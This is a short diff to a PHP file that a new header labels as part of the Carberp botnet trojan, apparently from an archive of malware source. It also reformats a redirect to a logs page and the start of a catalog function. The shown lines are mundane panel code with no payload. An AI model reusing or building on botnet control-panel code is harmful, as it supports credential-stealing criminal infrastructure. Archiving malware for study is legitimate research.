@@ -1,6 +1,18 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
-if(file_exists('cache/pid_import.txt')){	header('Location: /logs/');
+if(file_exists('cache/pid_import.txt')){
+	header('Location: /logs/');
 	exit;
 }
 
@@ -13,7 +25,8 @@ function catalog_item_load($parent){
 	$count_id = count($parent_id);
     $parent->sub = array();
 
-	switch($count_id){		case '0':
+	switch($count_id){
+		case '0':
 			$list[$parent->id] = $parent;
 		break;
 
